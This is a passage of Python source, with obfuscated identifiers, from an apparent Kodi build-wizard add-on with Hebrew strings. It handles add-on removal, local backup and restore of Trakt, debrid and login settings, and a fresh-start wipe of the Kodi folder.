			if OO0000O00000OO0OO ==ACTION_PREVIOUS_MENU :O0OOO0OO0O000OO0O .close ()#line:4644
			elif OO0000O00000OO0OO ==ACTION_NAV_BACK :O0OOO0OO0O000OO0O .close ()#line:4645
	if default ==None :default =wiz .Grab_Log (True )#line:4646
	O00OOOOO00O000O00 =O0O00OO00OO00OOOO ("LogViewer.xml",ADDON .getAddonInfo ('path'),'DefaultSkin',default =default )#line:4647
	O00OOOOO00O000O00 .doModal ()#line:4648
	del O00OOOOO00O000O00 #line:4649
def removeAddon (OO000O00O0O0O0O0O ,OO0OOOO000O000OO0 ,over =False ):#line:4651
	if not over ==False :#line:4652
		OO00O000OO00OO0OO =1 #line:4653
	else :#line:4654
		OO00O000OO00OO0OO =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Are you sure you want to delete the addon:'%COLOR2 ,'Name: [COLOR %s]%s[/COLOR]'%(COLOR1 ,OO0OOOO000O000OO0 ),'ID: [COLOR %s]%s[/COLOR][/COLOR]'%(COLOR1 ,OO000O00O0O0O0O0O ),yeslabel ='[B][COLOR green]Remove Addon[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]')#line:4655
	if OO00O000OO00OO0OO ==1 :#line:4656
		OO0O000O0O0O00O0O =os .path .join (ADDONS ,OO000O00O0O0O0O0O )#line:4657
		wiz .log ("Removing Addon %s"%OO000O00O0O0O0O0O )#line:4658
		wiz .cleanHouse (OO0O000O0O0O00O0O )#line:4659
		xbmc .sleep (1000 )#line:4660
		try :shutil .rmtree (OO0O000O0O0O00O0O )#line:4661
		except Exception as O0O0OOOO00O00O0OO :wiz .log ("Error removing %s"%OO000O00O0O0O0O0O ,xbmc .LOGNOTICE )#line:4662
		removeAddonData (OO000O00O0O0O0O0O ,OO0OOOO000O000OO0 ,over )#line:4663
	if over ==False :#line:4664
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]%s Removed[/COLOR]"%(COLOR2 ,OO0OOOO000O000OO0 ))#line:4665
def removeAddonData (OO0OOOO0OO00O0O00 ,name =None ,over =False ):#line:4667
	if OO0OOOO0OO00O0O00 =='all':#line:4668
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4669
			wiz .cleanHouse (ADDOND )#line:4670
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4671
	elif OO0OOOO0OO00O0O00 =='uninstalled':#line:4672
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder for uninstalled addons?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4673
			OOOOOOO0O0O0000OO =0 #line:4674
			for OOO0O0OO0O0OO000O in glob .glob (os .path .join (ADDOND ,'*')):#line:4675
				OOOOOOO0O0O0OOO00 =OOO0O0OO0O0OO000O .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:4676
				if OOOOOOO0O0O0OOO00 in EXCLUDES :pass #line:4677
				elif os .path .exists (os .path .join (ADDONS ,OOOOOOO0O0O0OOO00 )):pass #line:4678
				else :wiz .cleanHouse (OOO0O0OO0O0OO000O );OOOOOOO0O0O0000OO +=1 ;wiz .log (OOO0O0OO0O0OO000O );shutil .rmtree (OOO0O0OO0O0OO000O )#line:4679
			wiz .LogNotify ('[COLOR %s]Clean up Uninstalled[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,OOOOOOO0O0O0000OO ))#line:4680
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4681
	elif OO0OOOO0OO00O0O00 =='empty':#line:4682
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] empty addon data folders in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4683
			OOOOOOO0O0O0000OO =wiz .emptyfolder (ADDOND )#line:4684
			wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,OOOOOOO0O0O0000OO ))#line:4685
		else :wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4686
	else :#line:4687
		O0000O00O0OO00OOO =os .path .join (USERDATA ,'addon_data',OO0OOOO0OO00O0O00 )#line:4688
		if OO0OOOO0OO00O0O00 in EXCLUDES :#line:4689
			wiz .LogNotify ("[COLOR %s]Protected Plugin[/COLOR]"%COLOR1 ,"[COLOR %s]Not allowed to remove Addon_Data[/COLOR]"%COLOR2 )#line:4690
		elif os .path .exists (O0000O00O0OO00OOO ):#line:4691
			if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you also like to remove the addon data for:[/COLOR]'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,OO0OOOO0OO00O0O00 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4692
				wiz .cleanHouse (O0000O00O0OO00OOO )#line:4693
				try :#line:4694
					shutil .rmtree (O0000O00O0OO00OOO )#line:4695
				except :#line:4696
					wiz .log ("Error deleting: %s"%O0000O00O0OO00OOO )#line:4697
			else :#line:4698
				wiz .log ('Addon data for %s was not removed'%OO0OOOO0OO00O0O00 )#line:4699
	wiz .refresh ()#line:4700
def restoreit (O0O0OOOO0O0OOOO0O ):#line:4702
	if O0O0OOOO0O0OOOO0O =='build':#line:4703
		OOOOO0000000O0OOO =freshStart ('restore')#line:4704
		if OOOOO0000000O0OOO ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Local Restore Cancelled[/COLOR]"%COLOR2 );return #line:4705
	if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary']:#line:4706
		wiz .skinToDefault ()#line:4707
	wiz .restoreLocal (O0O0OOOO0O0OOOO0O )#line:4708
def restoreextit (O00OOOOO0OOO00O0O ):#line:4710
	if O00OOOOO0OOO00O0O =='build':#line:4711
		O0000O0O0000O0OOO =freshStart ('restore')#line:4712
		if O0000O0O0000O0OOO ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]External Restore Cancelled[/COLOR]"%COLOR2 );return #line:4713
	wiz .restoreExternal (O00OOOOO0OOO00O0O )#line:4714
def buildInfo (OO00OOO0OOOOOO0O0 ):#line:4716
	if wiz .workingURL (SPEEDFILE )==True :#line:4717
		if wiz .checkBuild (OO00OOO0OOOOOO0O0 ,'url'):#line:4718
			OO00OOO0OOOOOO0O0 ,O0O00OOOO0OO0O00O ,O000000O000000O0O ,OO0OOO00OOOOOOO0O ,O000O0O0OO0O00O00 ,OOOOOO00O000O0000 ,OOO00OOO0O0OO0OOO ,O0OO0O0000O00O00O ,O0OOO0OO000000000 ,O0O00O00O00OO000O ,OOOOOOO00000O000O =wiz .checkBuild (OO00OOO0OOOOOO0O0 ,'all')#line:4719
			O0O00O00O00OO000O ='Yes'if O0O00O00O00OO000O .lower ()=='yes'else 'No'#line:4720
			O0O00O00000O00O00 ="[COLOR %s]שם הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OO00OOO0OOOOOO0O0 )#line:4721
			O0O00O00000O00O00 +="[COLOR %s]גירסת הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O0O00OOOO0OO0O00O )#line:4722
			if not OOOOOO00O000O0000 =="http://":#line:4723
				OOO0OOOOOOO0O00OO =wiz .themeCount (OO00OOO0OOOOOO0O0 ,False )#line:4724
				O0O00O00000O00O00 +="[COLOR %s]Build Theme(s):[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,', '.join (OOO0OOOOOOO0O00OO ))#line:4725
			O0O00O00000O00O00 +="[COLOR %s]קודי גירסה:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O000O0O0OO0O00O00 )#line:4726
			O0O00O00000O00O00 +="[COLOR %s]Adult Content:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O0O00O00O00OO000O )#line:4727
			O0O00O00000O00O00 +="[COLOR %s]תאור:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OOOOOOO00000O000O )#line:4728
			wiz .TextBox (ADDONTITLE ,O0O00O00000O00O00 )#line:4729
		else :wiz .log ("Invalid Build Name!")#line:4730
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:4731
def buildVideo (O0000OO000O0OOOO0 ):#line:4733
	wiz .log ("DDDDDDDDDDDDDDDDDDDDDDDDD: %s"%wiz .workingURL (SPEEDFILE ))#line:4734
	if wiz .workingURL (SPEEDFILE )==True :#line:4735
		O000OO0O0OO00O0O0 =wiz .checkBuild (O0000OO000O0OOOO0 ,'preview')#line:4736
		wiz .log ("FFFFFFFFFFFFFFFFFFFFFFFFFF: %s"%O0000OO000O0OOOO0 )#line:4737
		if O000OO0O0OO00O0O0 and not O000OO0O0OO00O0O0 =='http://':playVideo (O000OO0O0OO00O0O0 )#line:4738
		else :wiz .log ("[%s]Unable to find url for video preview"%O0000OO000O0OOOO0 )#line:4739
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:4740
def dependsList (O000OOOO000O00O0O ):#line:4742
	OO00O000OOO000000 =os .path .join (ADDONS ,O000OOOO000O00O0O ,'addon.xml')#line:4743
	if os .path .exists (OO00O000OOO000000 ):#line:4744
		O0OOOO00OO0OOO00O =open (OO00O000OOO000000 ,mode ='r');OOO0OO0OO0O0OO000 =O0OOOO00OO0OOO00O .read ();O0OOOO00OO0OOO00O .close ();#line:4745
		O00O0O00O0O0OOOOO =wiz .parseDOM (OOO0OO0OO0O0OO000 ,'import',ret ='addon')#line:4746
		OO0O0O0O0OO0OO0O0 =[]#line:4747
		for OOOO00OOO0O000OOO in O00O0O00O0O0OOOOO :#line:4748
			if not 'xbmc.python'in OOOO00OOO0O000OOO :#line:4749
				OO0O0O0O0OO0OO0O0 .append (OOOO00OOO0O000OOO )#line:4750
		return OO0O0O0O0OO0OO0O0 #line:4751
	return []#line:4752
def manageSaveData (OO0O0000OOO0OOO0O ):#line:4754
	if OO0O0000OOO0OOO0O =='import':#line:4755
		OO00O00O0O00OO000 =os .path .join (ADDONDATA ,'temp')#line:4756
		if not os .path .exists (OO00O00O0O00OO000 ):os .makedirs (OO00O00O0O00OO000 )#line:4757
		O000O0O0O00O0O0OO =DIALOG .browse (1 ,'[COLOR %s]Select the location of the SaveData.zip[/COLOR]'%COLOR2 ,'files','.zip',False ,False ,HOME )#line:4758
		if not O000O0O0O00O0O0OO .endswith ('.zip'):#line:4759
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Import Data Error![/COLOR]"%(COLOR2 ))#line:4760
			return #line:4761
		O0O0OOO0OOOO0OOO0 =os .path .join (MYBUILDS ,'SaveData.zip')#line:4762
		OO00O0OOO0000OO0O =xbmcvfs .copy (O000O0O0O00O0O0OO ,O0O0OOO0OOOO0OOO0 )#line:4763
		wiz .log ("%s"%str (OO00O0OOO0000OO0O ))#line:4764
		extract .all (xbmc .translatePath (O0O0OOO0OOOO0OOO0 ),OO00O00O0O00OO000 )#line:4765
		O000000O0O0O0O000 =os .path .join (OO00O00O0O00OO000 ,'trakt')#line:4766
		O00O0O00000O0OOO0 =os .path .join (OO00O00O0O00OO000 ,'login')#line:4767
		OOOO0O0O0OOOOO000 =os .path .join (OO00O00O0O00OO000 ,'debrid')#line:4768
		OOO0OOOO0O0O0O00O =0 #line:4769
		if os .path .exists (O000000O0O0O0O000 ):#line:4770
			OOO0OOOO0O0O0O00O +=1 #line:4771
			OO0OOOOOOOO0O00O0 =os .listdir (O000000O0O0O0O000 )#line:4772
			if not os .path .exists (traktit .TRAKTFOLD ):os .makedirs (traktit .TRAKTFOLD )#line:4773
			for OO00000O0O0000OOO in OO0OOOOOOOO0O00O0 :#line:4774
				O0O00OO0O00OOO000 =os .path .join (traktit .TRAKTFOLD ,OO00000O0O0000OOO )#line:4775
				OOO0000O0OOOO000O =os .path .join (O000000O0O0O0O000 ,OO00000O0O0000OOO )#line:4776
				if os .path .exists (O0O00OO0O00OOO000 ):#line:4777
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,OO00000O0O0000OOO ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4778
					else :os .remove (O0O00OO0O00OOO000 )#line:4779
				shutil .copy (OOO0000O0OOOO000O ,O0O00OO0O00OOO000 )#line:4780
			traktit .importlist ('all')#line:4781
			traktit .traktIt ('restore','all')#line:4782
		if os .path .exists (O00O0O00000O0OOO0 ):#line:4783
			OOO0OOOO0O0O0O00O +=1 #line:4784
			OO0OOOOOOOO0O00O0 =os .listdir (O00O0O00000O0OOO0 )#line:4785
			if not os .path .exists (loginit .LOGINFOLD ):os .makedirs (loginit .LOGINFOLD )#line:4786
			for OO00000O0O0000OOO in OO0OOOOOOOO0O00O0 :#line:4787
				O0O00OO0O00OOO000 =os .path .join (loginit .LOGINFOLD ,OO00000O0O0000OOO )#line:4788
				OOO0000O0OOOO000O =os .path .join (O00O0O00000O0OOO0 ,OO00000O0O0000OOO )#line:4789
				if os .path .exists (O0O00OO0O00OOO000 ):#line:4790
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,OO00000O0O0000OOO ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4791
					else :os .remove (O0O00OO0O00OOO000 )#line:4792
				shutil .copy (OOO0000O0OOOO000O ,O0O00OO0O00OOO000 )#line:4793
			loginit .importlist ('all')#line:4794
			loginit .loginIt ('restore','all')#line:4795
		if os .path .exists (OOOO0O0O0OOOOO000 ):#line:4796
			OOO0OOOO0O0O0O00O +=1 #line:4797
			OO0OOOOOOOO0O00O0 =os .listdir (OOOO0O0O0OOOOO000 )#line:4798
			if not os .path .exists (debridit .REALFOLD ):os .makedirs (debridit .REALFOLD )#line:4799
			for OO00000O0O0000OOO in OO0OOOOOOOO0O00O0 :#line:4800
				O0O00OO0O00OOO000 =os .path .join (debridit .REALFOLD ,OO00000O0O0000OOO )#line:4801
				OOO0000O0OOOO000O =os .path .join (OOOO0O0O0OOOOO000 ,OO00000O0O0000OOO )#line:4802
				if os .path .exists (O0O00OO0O00OOO000 ):#line:4803
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,OO00000O0O0000OOO ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4804
					else :os .remove (O0O00OO0O00OOO000 )#line:4805
				shutil .copy (OOO0000O0OOOO000O ,O0O00OO0O00OOO000 )#line:4806
			debridit .importlist ('all')#line:4807
			debridit .debridIt ('restore','all')#line:4808
		wiz .cleanHouse (OO00O00O0O00OO000 )#line:4809
		wiz .removeFolder (OO00O00O0O00OO000 )#line:4810
		os .remove (O0O0OOO0OOOO0OOO0 )#line:4811
		if OOO0OOOO0O0O0O00O ==0 :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Save Data Import Failed[/COLOR]"%COLOR2 )#line:4812
		else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Save Data Import Complete[/COLOR]"%COLOR2 )#line:4813
	elif OO0O0000OOO0OOO0O =='export':#line:4814
		OOO0OO00O0OOOO00O =xbmc .translatePath (MYBUILDS )#line:4815
		OOOOOO0000OO0O000 =[traktit .TRAKTFOLD ,debridit .REALFOLD ,loginit .LOGINFOLD ]#line:4816
		traktit .traktIt ('update','all')#line:4817
		loginit .loginIt ('update','all')#line:4818
		debridit .debridIt ('update','all')#line:4819
		O000O0O0O00O0O0OO =DIALOG .browse (3 ,'[COLOR %s]Select where you wish to export the savedata zip?[/COLOR]'%COLOR2 ,'files','',False ,True ,HOME )#line:4820
		O000O0O0O00O0O0OO =xbmc .translatePath (O000O0O0O00O0O0OO )#line:4821
		OO0O0OO000O00O000 =os .path .join (OOO0OO00O0OOOO00O ,'SaveData.zip')#line:4822
		OO000OO0O00O0O000 =zipfile .ZipFile (OO0O0OO000O00O000 ,mode ='w')#line:4823
		for OOOO0OOOO000OOO00 in OOOOOO0000OO0O000 :#line:4824
			if os .path .exists (OOOO0OOOO000OOO00 ):#line:4825
				OO0OOOOOOOO0O00O0 =os .listdir (OOOO0OOOO000OOO00 )#line:4826
				for OOOO000OOO000OO0O in OO0OOOOOOOO0O00O0 :#line:4827
					OO000OO0O00O0O000 .write (os .path .join (OOOO0OOOO000OOO00 ,OOOO000OOO000OO0O ),os .path .join (OOOO0OOOO000OOO00 ,OOOO000OOO000OO0O ).replace (ADDONDATA ,''),zipfile .ZIP_DEFLATED )#line:4828
		OO000OO0O00O0O000 .close ()#line:4829
		if O000O0O0O00O0O0OO ==OOO0OO00O0OOOO00O :#line:4830
			DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO0O0OO000O00O000 ))#line:4831
		else :#line:4832
			try :#line:4833
				xbmcvfs .copy (OO0O0OO000O00O000 ,os .path .join (O000O0O0O00O0O0OO ,'SaveData.zip'))#line:4834
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,os .path .join (O000O0O0O00O0O0OO ,'SaveData.zip')))#line:4835
			except :#line:4836
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO0O0OO000O00O000 ))#line:4837
def freshStart (install =None ,over =False ):#line:4842
	if USERNAME =='':#line:4843
		ADDON .openSettings ()#line:4844
		sys .exit ()#line:4845
	O0O000OOOOOOO0000 =(SPEEDFILE )#line:4846
	(O0O000OOOOOOO0000 )#line:4847
	OO0OO000O0OOOOO0O =(wiz .workingURL (O0O000OOOOOOO0000 ))#line:4848
	(OO0OO000O0OOOOO0O )#line:4849
	if KEEPTRAKT =='true':#line:4850
		traktit .autoUpdate ('all')#line:4851
		wiz .setS ('traktlastsave',str (THREEDAYS ))#line:4852
	if KEEPREAL =='true':#line:4853
		debridit .autoUpdate ('all')#line:4854
		wiz .setS ('debridlastsave',str (THREEDAYS ))#line:4855
	if KEEPLOGIN =='true':#line:4856
		loginit .autoUpdate ('all')#line:4857
		wiz .setS ('loginlastsave',str (THREEDAYS ))#line:4858
	if over ==True :O000O00OO0O0OOO0O =1 #line:4859
	elif install =='restore':O000O00OO0O0OOO0O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]בחרת לשחזר את הבילד מקובץ גיבוי קודם"%COLOR2 ,"האם להמשיך?[/COLOR]",nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4860
	elif install :O000O00OO0O0OOO0O =1 #line:4861
	else :O000O00OO0O0OOO0O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]התקנת הבילד"%COLOR2 ,"קודי אנונימוס?[/COLOR]",nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4862
	if O000O00OO0O0OOO0O :#line:4863
		if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']:#line:4864
			OO00OOOO0OOOO0O00 ='skin.confluence'if KODIV <17 else 'skin.estuary'if KODIV <17 else 'skin.anonymous.mod'if KODIV <17 else 'skin.estouchy'if KODIV <17 else 'skin.phenomenal'if KODIV <17 else 'skin.anonymous.nox'if KODIV <17 else 'skin.Premium.mod'#line:4865
			skinSwitch .swapSkins (OO00OOOO0OOOO0O00 )#line:4868
			OO0OO000O0OO00O0O =0 #line:4869
			xbmc .sleep (1000 )#line:4870
			while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and OO0OO000O0OO00O0O <150 :#line:4871
				OO0OO000O0OO00O0O +=1 #line:4872
				xbmc .sleep (1000 )#line:4873
				wiz .ebi ('SendAction(Select)')#line:4874
			if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4875
				wiz .ebi ('SendClick(11)')#line:4876
			else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: Skin Swap Timed Out![/COLOR]'%COLOR2 );return False #line:4877
			xbmc .sleep (1000 )#line:4878
		if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']:#line:4879
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: Skin Swap Failed![/COLOR]'%COLOR2 )#line:4880
			return #line:4881
		wiz .addonUpdates ('set')#line:4882
		OO0O0OOO00000O000 =os .path .abspath (HOME )#line:4883
		DP .create (ADDONTITLE ,"[COLOR %s]מחשב קבצים ותיקיות"%COLOR2 ,'','אנא המתן![/COLOR]')#line:4884
		OOOO0OOOOOO0OOOO0 =sum ([len (O000OO000O000OOOO )for O000OO0OO000OOO0O ,OOOO000OOOOOOO0OO ,O000OO000O000OOOO in os .walk (OO0O0OOO00000O000 )]);OOOO0OO0OOO0OOO00 =0 #line:4885
		DP .update (0 ,"[COLOR %s]Gathering Excludes list."%COLOR2 )#line:4886
		EXCLUDES .append ('My_Builds')#line:4887
		EXCLUDES .append ('archive_cache')#line:4888
		EXCLUDES .append ('script.module.requests')#line:4889
		EXCLUDES .append ('myfav.anon')#line:4890
		if KEEPREPOS =='true':#line:4891
			OO0OOO00O0O0OOOOO =glob .glob (os .path .join (ADDONS ,'repo*/'))#line:4892
			for OO0000OO0O0O00OOO in OO0OOO00O0O0OOOOO :#line:4893
				O0O00O000OOOO0OO0 =os .path .split (OO0000OO0O0O00OOO [:-1 ])[1 ]#line:4894
				if not O0O00O000OOOO0OO0 ==EXCLUDES :#line:4895
					EXCLUDES .append (O0O00O000OOOO0OO0 )#line:4896
		if KEEPSUPER =='true':#line:4897
			EXCLUDES .append ('plugin.program.super.favourites')#line:4898
		if KEEPMOVIELIST =='true':#line:4899
			EXCLUDES .append ('plugin.video.metalliq')#line:4900
		if KEEPMOVIELIST =='true':#line:4901
			EXCLUDES .append ('plugin.video.anonymous.wall')#line:4902
		if KEEPADDONS =='true':#line:4903
			EXCLUDES .append ('addons')#line:4904
		if KEEPTELEMEDIA =='true':#line:4905
			EXCLUDES .append ('plugin.video.telemedia')#line:4906
		EXCLUDES .append ('plugin.video.elementum')#line:4911
		EXCLUDES .append ('script.elementum.burst')#line:4912
		EXCLUDES .append ('script.elementum.burst-master')#line:4913
		EXCLUDES .append ('plugin.video.quasar')#line:4914
		EXCLUDES .append ('script.quasar.burst')#line:4915
		EXCLUDES .append ('skin.estuary')#line:4916
		if KEEPWHITELIST =='true':#line:4919
			O00OOOOOO0OO0000O =''#line:4920
			OOO0OO0000O0O0000 =wiz .whiteList ('read')#line:4921
			if len (OOO0OO0000O0O0000 )>0 :#line:4922
				for OO0000OO0O0O00OOO in OOO0OO0000O0O0000 :#line:4923
					try :O0000OOO0OO0OO0OO ,O0O0O000O00O0000O ,O0O0O00O000OOOO00 =OO0000OO0O0O00OOO #line:4924
					except :pass #line:4925
					if O0O0O00O000OOOO00 .startswith ('pvr'):O00OOOOOO0OO0000O =O0O0O000O00O0000O #line:4926
					O00O0O000O0000000 =dependsList (O0O0O00O000OOOO00 )#line:4927
					for OO000O00OO0OO000O in O00O0O000O0000000 :#line:4928
						if not OO000O00OO0OO000O in EXCLUDES :#line:4929
							EXCLUDES .append (OO000O00OO0OO000O )#line:4930
						OOOO000O000OOO00O =dependsList (OO000O00OO0OO000O )#line:4931
						for O00O0O000O0000OOO in OOOO000O000OOO00O :#line:4932
							if not O00O0O000O0000OOO in EXCLUDES :#line:4933
								EXCLUDES .append (O00O0O000O0000OOO )#line:4934
					if not O0O0O00O000OOOO00 in EXCLUDES :#line:4935
						EXCLUDES .append (O0O0O00O000OOOO00 )#line:4936
				if not O00OOOOOO0OO0000O =='':wiz .setS ('pvrclient',O0O0O00O000OOOO00 )#line:4937
		if wiz .getS ('pvrclient')=='':#line:4938
			for OO0000OO0O0O00OOO in EXCLUDES :#line:4939
				if OO0000OO0O0O00OOO .startswith ('pvr'):#line:4940
					wiz .setS ('pvrclient',OO0000OO0O0O00OOO )#line:4941
		DP .update (0 ,"[COLOR %s]מנקה קבצים ותיקיות:"%COLOR2 )#line:4942
		O00OOO0O000OO0O00 =wiz .latestDB ('Addons')#line:4943
		for OOO0OO00000OOO00O ,O000O0O00OOOO00OO ,O000OO0O00OO0OOOO in os .walk (OO0O0OOO00000O000 ,topdown =True ):#line:4944
			O000O0O00OOOO00OO [:]=[OOOOOO0OO00OOOO0O for OOOOOO0OO00OOOO0O in O000O0O00OOOO00OO if OOOOOO0OO00OOOO0O not in EXCLUDES ]#line:4945
			for O0000OOO0OO0OO0OO in O000OO0O00OO0OOOO :#line:4946
				OOOO0OO0OOO0OOO00 +=1 #line:4947
				O0O0O00O000OOOO00 =OOO0OO00000OOO00O .replace ('/','\\').split ('\\')#line:4948
				OO0OO000O0OO00O0O =len (O0O0O00O000OOOO00 )-1 #line:4950
				if O0O0O00O000OOOO00 [OO0OO000O0OO00O0O -2 ]=='userdata'and O0O0O00O000OOOO00 [OO0OO000O0OO00O0O -1 ]=='addon_data'and 'script.skinshortcuts'in O0O0O00O000OOOO00 [OO0OO000O0OO00O0O ]and KEEPSKIN =='true':wiz .log ("Keep Skin: %s"%os .path .join (OOO0OO00000OOO00O ,O0000OOO0OO0OO0OO ),xbmc .LOGNOTICE )#line:4951
				elif O0000OOO0OO0OO0OO =='MyVideos99.db'and O0O0O00O000OOOO00 [OO0OO000O0OO00O0O -1 ]=='userdata'and O0O0O00O000OOOO00 [OO0OO000O0OO00O0O -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (OOO0OO00000OOO00O ,O0000OOO0OO0OO0OO ),xbmc .LOGNOTICE )#line:4952
				elif O0000OOO0OO0OO0OO =='MyVideos107.db'and O0O0O00O000OOOO00 [OO0OO000O0OO00O0O -1 ]=='userdata'and O0O0O00O000OOOO00 [OO0OO000O0OO00O0O -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (OOO0OO00000OOO00O ,O0000OOO0OO0OO0OO ),xbmc .LOGNOTICE )#line:4953
				elif O0000OOO0OO0OO0OO =='MyVideos116.db'and O0O0O00O000OOOO00 [OO0OO000O0OO00O0O -1 ]=='userdata'and O0O0O00O000OOOO00 [OO0OO000O0OO00O0O -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (OOO0OO00000OOO00O ,O0000OOO0OO0OO0OO ),xbmc .LOGNOTICE )#line:4954
				elif O0000OOO0OO0OO0OO =='MyVideos99.db'and O0O0O00O000OOOO00 [OO0OO000O0OO00O0O -1 ]=='userdata'and O0O0O00O000OOOO00 [OO0OO000O0OO00O0O -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (OOO0OO00000OOO00O ,O0000OOO0OO0OO0OO ),xbmc .LOGNOTICE )#line:4955
				elif O0000OOO0OO0OO0OO =='MyVideos107.db'and O0O0O00O000OOOO00 [OO0OO000O0OO00O0O -1 ]=='userdata'and O0O0O00O000OOOO00 [OO0OO000O0OO00O0O -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (OOO0OO00000OOO00O ,O0000OOO0OO0OO0OO ),xbmc .LOGNOTICE )#line:4956
